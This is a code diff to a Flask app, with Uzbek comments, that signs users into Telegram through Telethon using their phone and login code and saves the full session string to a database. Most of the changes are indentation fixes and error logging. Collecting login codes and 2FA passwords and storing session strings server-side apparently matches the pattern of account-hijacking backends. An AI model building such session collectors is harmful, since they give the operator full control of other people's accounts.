@@ -126,6 +126,8 @@ def send_code():
 # =====================
 # VERIFY CODE
 # =====================
+from database import save_session  # yuqorida import bo‘lsin
+
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
     data = request.json
@@ -140,30 +142,28 @@ def verify_code():
         })
 
     async def _verify():
-    client = TelegramClient(
-        os.path.join(SESSIONS_DIR, phone.replace("+", "")),
-        API_ID,
-        API_HASH
-    )
-    await client.connect()
+        client = TelegramClient(
+            os.path.join(SESSIONS_DIR, phone.replace("+", "")),
+            API_ID,
+            API_HASH
+        )
+        await client.connect()
 
-    await client.sign_in(
-        phone=phone,
-        code=code,
-        phone_code_hash=phone_code_hash
-    )
+        await client.sign_in(
+            phone=phone,
+            code=code,
+            phone_code_hash=phone_code_hash
+        )
 
-    me = await client.get_me()  # 🔥 ENG MUHIM QATOR
+        me = await client.get_me()
 
-    session_str = client.session.save()  # 🔥 SESSION
-    save_session(me.id, session_str)     # 🔥 DB GA YOZAMIZ
+        session_str = client.session.save()
+        save_session(me.id, session_str)
 
-    await client.disconnect()
+        await client.disconnect()
 
     try:
         asyncio.run(_verify())
-
-        # 🔥 ISH BITDI — HASHNI O‘CHIRAMIZ
         pending_codes.pop(phone, None)
 
         return jsonify({
@@ -172,16 +172,14 @@ def verify_code():
         })
 
     except SessionPasswordNeededError:
-        return jsonify({
-            "status": "2fa_required"
-        })
+        return jsonify({"status": "2fa_required"})
 
     except Exception as e:
+        print("VERIFY ERROR:", repr(e))
         return jsonify({
             "status": "error",
             "message": "Kod noto‘g‘ri yoki eskirgan"
         })
-
 
 # =====================
 # VERIFY 2FA PASSWORD
